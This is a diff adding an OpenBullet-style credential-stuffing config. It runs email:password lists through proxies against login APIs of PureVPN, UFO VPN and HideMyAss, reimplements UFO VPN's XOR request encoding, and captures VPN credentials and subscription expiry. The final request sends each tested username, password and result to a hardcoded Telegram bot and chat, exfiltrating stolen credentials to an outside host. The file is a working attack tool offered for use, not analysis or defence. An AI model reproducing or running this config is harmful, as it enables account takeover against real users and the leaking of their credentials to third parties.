@@ -1,0 +1,467 @@
+[SETTINGS]
+{
+  "Name": "3 VPN in ONE Config",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-28T12:30:53.6237156+00:00",
+  "AdditionalInfo": "",
+  "Author": "Peruuuboii",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "TT" 
+
+FUNCTION GenerateGUID -> VAR "GUID" 
+
+REQUEST POST "https://api.proxy.purevpn.com/v1/auth/email?timestamp=<TT>" 
+  CONTENT "platform_name=Chrome&platform_version=87.0.4280.141&platform_locale=en-US&app_version=4.9.0&user_os=win&id=bfidboloedlamgdmenmlbipfnccokknp&uuid=<GUID>&usid=&email=<USER>&domain_fronting=false&password=<PASS>&allow_multiuser=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.proxy.purevpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: chrome-extension://bfidboloedlamgdmenmlbipfnccokknp" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 271" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_exceeded" 
+    KEY "<RESPONSECODE>" Contains "429" 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "e" 
+
+IF "<SOURCE>" Contains "message\":\"success"
+SET VAR "PURE" "TRUE" 
+
+PARSE "<SOURCE>" JSON "vpn_username" CreateEmpty=FALSE -> CAP "VPN USER" 
+
+PARSE "<SOURCE>" LR "\"vpn_password\":\"" "\"" CreateEmpty=FALSE -> CAP "VPN PASS" 
+
+ELSE
+SET VAR "PURE" "FALSE" 
+ENDIF
+IF "<SOURCE>" Contains "\"vpn_username\":null"
+SET VAR "PURE" "CUSTOM"
+ENDIF
+
+FUNCTION Constant "<PURE>" -> CAP "PURE VPN" 
+
+FUNCTION Constant "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"os\":\"os_web\",\"dev_id\":\"dev_test_123\",\"name\":\"test-dev-1\"}" -> VAR "DATA" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "UID" 
+
+FUNCTION Substring "5" "34" "<UID>" -> CAP "QWE" 
+
+BEGIN SCRIPT JavaScript
+// XORCipher - Super simple encryption using XOR and Base64
+//
+// As a warning, this is **not** a secure encryption algorithm. It uses a very
+// simplistic keystore and will be easy to crack.
+//
+// The Base64 algorithm is a modification of the one used in phpjs.org
+// * http://phpjs.org/functions/base64_encode/
+// * http://phpjs.org/functions/base64_decode/
+//
+// stringToUtf8ByteArray() and utf8ByteArrayToString()
+// https://github.com/google/closure-library/blob/466a34e7e2d4cb49ac1c731347e845235d8ce7cc/closure/goog/crypt/crypt.js#L117-L143
+// https://github.com/google/closure-library/blob/466a34e7e2d4cb49ac1c731347e845235d8ce7cc/closure/goog/crypt/crypt.js#L151-L178
+// Examples
+// --------
+//
+//     XORCipher.encode("test", "foobar");   // => "EgocFhUX"
+//     XORCipher.decode("test", "EgocFhUX"); // => "foobar"
+//
+// Copyright © 2013 Devin Weaver <suki@tritarget.org>
+//
+// This program is free software. It comes without any warranty, to
+// the extent permitted by applicable law. You can redistribute it
+// and/or modify it under the terms of the Do What The Fuck You Want
+// To Public License, Version 2, as published by Sam Hocevar. See
+// http://www.wtfpl.net/ for more details.
+/* jshint forin:true, noarg:true, noempty:true, eqeqeq:true, strict:true,
+  undef:true, unused:true, curly:true, browser:true, indent:2, maxerr:50 */
+/* global _ */
+(function(exports) {
+   "use strict";
+   var XORCipher = {
+   	encode: function(key, data) {
+   		data = xor_encrypt(key, data);
+   		return b64_encode(data);
+   	},
+   	decode: function(key, data) {
+   		data = b64_decode(data);
+   		return xor_decrypt(key, data);
+   	}
+   };
+   function stringToUtf8ByteArray(str) {
+   	var out = [], p = 0;
+   	for (var i = 0; i < str.length; i++) {
+   		var c = str.charCodeAt(i);
+   		if (c < 128) {
+   			out[p++] = c;
+   		} else if (c < 2048) {
+   			out[p++] = (c >> 6) | 192;
+   			out[p++] = (c & 63) | 128;
+   		} else if (
+   				((c & 0xFC00) == 0xD800) && (i + 1) < str.length &&
+   				((str.charCodeAt(i + 1) & 0xFC00) == 0xDC00)) {
+   			// Surrogate Pair
+   			c = 0x10000 + ((c & 0x03FF) << 10) + (str.charCodeAt(++i) & 0x03FF);
+   			out[p++] = (c >> 18) | 240;
+   			out[p++] = ((c >> 12) & 63) | 128;
+   			out[p++] = ((c >> 6) & 63) | 128;
+   			out[p++] = (c & 63) | 128;
+   		} else {
+   			out[p++] = (c >> 12) | 224;
+   			out[p++] = ((c >> 6) & 63) | 128;
+   			out[p++] = (c & 63) | 128;
+   		}
+   	}
+   	return out;
+   }
+   function utf8ByteArrayToString(bytes) { // array of bytes
+   	var out = [], pos = 0, c = 0;
+   	while (pos < bytes.length) {
+   		var c1 = bytes[pos++];
+   		if (c1 < 128) {
+   			out[c++] = String.fromCharCode(c1);
+   		} else if (c1 > 191 && c1 < 224) {
+   			var c2 = bytes[pos++];
+   			out[c++] = String.fromCharCode((c1 & 31) << 6 | c2 & 63);
+   		} else if (c1 > 239 && c1 < 365) {
+   			// Surrogate Pair
+   			var c2 = bytes[pos++];
+   			var c3 = bytes[pos++];
+   			var c4 = bytes[pos++];
+   			var u = ((c1 & 7) << 18 | (c2 & 63) << 12 | (c3 & 63) << 6 | c4 & 63) -
+   					0x10000;
+   			out[c++] = String.fromCharCode(0xD800 + (u >> 10));
+   			out[c++] = String.fromCharCode(0xDC00 + (u & 1023));
+   		} else {
+   			var c2 = bytes[pos++];
+   			var c3 = bytes[pos++];
+   			out[c++] =
+   					String.fromCharCode((c1 & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
+   		}
+   	}
+   	return out.join('');
+   }
+   var b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+   function b64_encode(data) {
+   	var o1, o2, o3, h1, h2, h3, h4, bits, r, i = 0, enc = "";
+   	if (!data) { return data; }
+   	do {
+   		o1 = data[i++];
+   		o2 = data[i++];
+   		o3 = data[i++];
+   		bits = o1 << 16 | o2 << 8 | o3;
+   		h1 = bits >> 18 & 0x3f;
+   		h2 = bits >> 12 & 0x3f;
+   		h3 = bits >> 6 & 0x3f;
+   		h4 = bits & 0x3f;
+   		enc += b64_table.charAt(h1) + b64_table.charAt(h2) + b64_table.charAt(h3) + b64_table.charAt(h4);
+   	} while (i < data.length);
+   	r = data.length % 3;
+   	return (r ? enc.slice(0, r - 3) : enc) + "===".slice(r || 3);
+   }
+   function b64_decode(data) {
+   	var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, result = [];
+   	if (!data) { return data; }
+   	data += "";
+   	do {
+   		h1 = b64_table.indexOf(data.charAt(i++));
+   		h2 = b64_table.indexOf(data.charAt(i++));
+   		h3 = b64_table.indexOf(data.charAt(i++));
+   		h4 = b64_table.indexOf(data.charAt(i++));
+   		bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
+   		o1 = bits >> 16 & 0xff;
+   		o2 = bits >> 8 & 0xff;
+   		o3 = bits & 0xff;
+   		result.push(o1);
+   		if (h3 !== 64) {
+   			result.push(o2);
+   			if (h4 !== 64) {
+   				result.push(o3);
+   			}
+   		}
+   	} while (i < data.length);
+   	return result;
+   }
+   function xor_encrypt(key, data) {
+   	key = stringToUtf8ByteArray(key);
+   	return stringToUtf8ByteArray(data).map(function(c, i) {
+   		return c ^ key[Math.floor(i % key.length)];
+   	});
+   }
+   function xor_decrypt(key, data) {
+   	key = stringToUtf8ByteArray(key);
+   	return utf8ByteArrayToString(data.map(function(c, i) {
+   		return c ^ key[Math.floor(i % key.length)];
+   	}));
+   }
+   exports.XORCipher = XORCipher;
+})(this);
+UI = UID.slice(5);
+DATA =  XORCipher.encode(UI,DATA);
+END SCRIPT -> VARS "DATA,UI"
+
+REQUEST POST "https://ufovpn.io/api/v4/login/" 
+  CONTENT "<DATA>" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "app-ver: 1.0.0" 
+  HEADER "content-length: 140" 
+  HEADER "content-type: application/json" 
+  HEADER "country: us" 
+  HEADER "mask: <UID>" 
+  HEADER "origin: https://ufovpn.io" 
+  HEADER "os: os_web" 
+  HEADER "package: wifisecurity.ufovpn.web" 
+  HEADER "referer: https://ufovpn.io/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
+  HEADER "vip-level: free" 
+
+FUNCTION Constant "<HEADERS(mask)>" -> VAR "UID" 
+
+BEGIN SCRIPT JavaScript
+(function(exports) {
+   "use strict";
+   var XORCipher = {
+   	encode: function(key, data) {
+   		data = xor_encrypt(key, data);
+   		return b64_encode(data);
+   	},
+   	decode: function(key, data) {
+   		data = b64_decode(data);
+   		return xor_decrypt(key, data);
+   	}
+   };
+   function stringToUtf8ByteArray(str) {
+   	var out = [], p = 0;
+   	for (var i = 0; i < str.length; i++) {
+   		var c = str.charCodeAt(i);
+   		if (c < 128) {
+   			out[p++] = c;
+   		} else if (c < 2048) {
+   			out[p++] = (c >> 6) | 192;
+   			out[p++] = (c & 63) | 128;
+   		} else if (
+   				((c & 0xFC00) == 0xD800) && (i + 1) < str.length &&
+   				((str.charCodeAt(i + 1) & 0xFC00) == 0xDC00)) {
+   			// Surrogate Pair
+   			c = 0x10000 + ((c & 0x03FF) << 10) + (str.charCodeAt(++i) & 0x03FF);
+   			out[p++] = (c >> 18) | 240;
+   			out[p++] = ((c >> 12) & 63) | 128;
+   			out[p++] = ((c >> 6) & 63) | 128;
+   			out[p++] = (c & 63) | 128;
+   		} else {
+   			out[p++] = (c >> 12) | 224;
+   			out[p++] = ((c >> 6) & 63) | 128;
+   			out[p++] = (c & 63) | 128;
+   		}
+   	}
+   	return out;
+   }
+   function utf8ByteArrayToString(bytes) { // array of bytes
+   	var out = [], pos = 0, c = 0;
+   	while (pos < bytes.length) {
+   		var c1 = bytes[pos++];
+   		if (c1 < 128) {
+   			out[c++] = String.fromCharCode(c1);
+   		} else if (c1 > 191 && c1 < 224) {
+   			var c2 = bytes[pos++];
+   			out[c++] = String.fromCharCode((c1 & 31) << 6 | c2 & 63);
+   		} else if (c1 > 239 && c1 < 365) {
+   			// Surrogate Pair
+   			var c2 = bytes[pos++];
+   			var c3 = bytes[pos++];
+   			var c4 = bytes[pos++];
+   			var u = ((c1 & 7) << 18 | (c2 & 63) << 12 | (c3 & 63) << 6 | c4 & 63) -
+   					0x10000;
+   			out[c++] = String.fromCharCode(0xD800 + (u >> 10));
+   			out[c++] = String.fromCharCode(0xDC00 + (u & 1023));
+   		} else {
+   			var c2 = bytes[pos++];
+   			var c3 = bytes[pos++];
+   			out[c++] =
+   					String.fromCharCode((c1 & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
+   		}
+   	}
+   	return out.join('');
+   }
+   var b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+   function b64_encode(data) {
+   	var o1, o2, o3, h1, h2, h3, h4, bits, r, i = 0, enc = "";
+   	if (!data) { return data; }
+   	do {
+   		o1 = data[i++];
+   		o2 = data[i++];
+   		o3 = data[i++];
+   		bits = o1 << 16 | o2 << 8 | o3;
+   		h1 = bits >> 18 & 0x3f;
+   		h2 = bits >> 12 & 0x3f;
+   		h3 = bits >> 6 & 0x3f;
+   		h4 = bits & 0x3f;
+   		enc += b64_table.charAt(h1) + b64_table.charAt(h2) + b64_table.charAt(h3) + b64_table.charAt(h4);
+   	} while (i < data.length);
+   	r = data.length % 3;
+   	return (r ? enc.slice(0, r - 3) : enc) + "===".slice(r || 3);
+   }
+   function b64_decode(data) {
+   	var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, result = [];
+   	if (!data) { return data; }
+   	data += "";
+   	do {
+   		h1 = b64_table.indexOf(data.charAt(i++));
+   		h2 = b64_table.indexOf(data.charAt(i++));
+   		h3 = b64_table.indexOf(data.charAt(i++));
+   		h4 = b64_table.indexOf(data.charAt(i++));
+   		bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
+   		o1 = bits >> 16 & 0xff;
+   		o2 = bits >> 8 & 0xff;
+   		o3 = bits & 0xff;
+   		result.push(o1);
+   		if (h3 !== 64) {
+   			result.push(o2);
+   			if (h4 !== 64) {
+   				result.push(o3);
+   			}
+   		}
+   	} while (i < data.length);
+   	return result;
+   }
+   function xor_encrypt(key, data) {
+   	key = stringToUtf8ByteArray(key);
+   	return stringToUtf8ByteArray(data).map(function(c, i) {
+   		return c ^ key[Math.floor(i % key.length)];
+   	});
+   }
+   function xor_decrypt(key, data) {
+   	key = stringToUtf8ByteArray(key);
+   	return utf8ByteArrayToString(data.map(function(c, i) {
+   		return c ^ key[Math.floor(i % key.length)];
+   	}));
+   }
+   exports.XORCipher = XORCipher;
+})(this);
+UI = UID.slice(6);
+DAT =  XORCipher.decode(UI,SOURCE);
+END SCRIPT -> VARS "DAT"
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_exceeded" 
+    KEY "<RESPONSECODE>" Contains "429" 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "e" 
+
+IF "<DAT>" Contains "msg\":\"ok" 
+SET VAR "UFO" "TRUE"
+
+PARSE "<DAT>" REGEX "(?<=expire_time\":\\{\"timestamp\":)(\\d{10})(?=000,)" "[0]" -> VAR "Exp" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" 
+
+ELSE
+SET VAR "UFO" "FALSE"
+ENDIF
+
+FUNCTION Constant "<UFO>" -> CAP "UFO VPN" 
+
+#ENCRYPT FUNCTION Hash MD5 "<PASS>" -> VAR "PD" 
+
+#LOGIN REQUEST GET "https://vpn.hidemyass.com/vpncontrol/accounts/info28/<USER>/<PD>" 
+  
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_exceeded" 
+    KEY "<RESPONSECODE>" Contains "429" 
+  KEYCHAIN Retry AND 
+    KEY "<SOURCE>" DoesNotContain "e" 
+    KEY "<SOURCE>" DoesNotContain "a" 
+    KEY "<SOURCE>" DoesNotContain "f" 
+
+IF "<SOURCE>" Contains "TIME_UNTIL:-1" 
+SET VAR "HMA" "FALSE"
+ELSE
+
+#EXPIRY PARSE "<SOURCE>" LR "TIME_UNTIL:" "" CreateEmpty=FALSE -> CAP "DAYZ LEFT" 
+
+SET VAR "HMA" "TRUE"
+ENDIF
+
+FUNCTION Constant "<HMA>" -> CAP "HMA VPN" 
+
+ 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<UFO>" EqualTo "FALSE" 
+    KEY "<PURE>" EqualTo "FALSE" 
+    KEY "<HMA>" EqualTo "FALSE" 
+  KEYCHAIN Custom "CONFIGS_GRAM" OR 
+    KEY "<PURE>" EqualTo "CUSTOM" 
+    KEY "<DAYZ LEFT>" LessThan "1" 
+  KEYCHAIN Success OR 
+    KEY "<UFO>" EqualTo "TRUE" 
+    KEY "<PURE>" EqualTo "TRUE" 
+    KEY "<DAYZ LEFT>" GreaterThan "1" 
+
+REQUEST GET "https://api.telegram.org/bot1140096052:AAH0JAJvw3alGsaATVK4M1RWq27QTAkUgwQ/sendmessage?chat_id=-1001351764606&text=3VPN <USER>:<PASS> | UFO:<UFO> | PURE:<PURE> | HMA:<HMA> DAYZ LEFT=<DAYZ LEFT> " 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*"
